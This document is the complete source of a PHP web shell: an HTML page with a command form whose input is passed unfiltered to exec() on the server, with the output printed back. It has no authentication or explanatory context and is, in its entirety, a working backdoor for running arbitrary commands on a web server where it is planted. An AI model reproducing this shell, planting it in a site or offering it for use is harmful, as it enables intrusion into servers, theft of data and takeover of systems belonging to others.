<title>PHP Web Shell</title>
<html>
<body>

    <form id="execute_form" autocomplete="off">
        <b>Command</b><input type="text" name="id" id="id" autofocus="autofocus" style="width: 600px" />
        <input type="submit" value="Execute" />
    </form>

    <!-- PHP code that executes command and outputs cleanly -->
    <?php
        $command = $_GET['id'];
        echo "<b>Executed:</b>  $command";
        echo str_repeat("<br>",2);
        echo "<b>Output:</b>";
        echo str_repeat("<br>",2);
        exec($command . " 2>&1", $output, $return_status);
        if (isset($return_status)):
            if ($return_status !== 0):
                echo "<font color='red'>Error in Code Execution -->  </font>";
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            elseif ($return_status == 0 && empty($output)):
                echo "<font color='green'>Command ran successfully, but does not have any output.</font>";
            else:
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            endif;
        endif;
    ?>
</body>
</html>
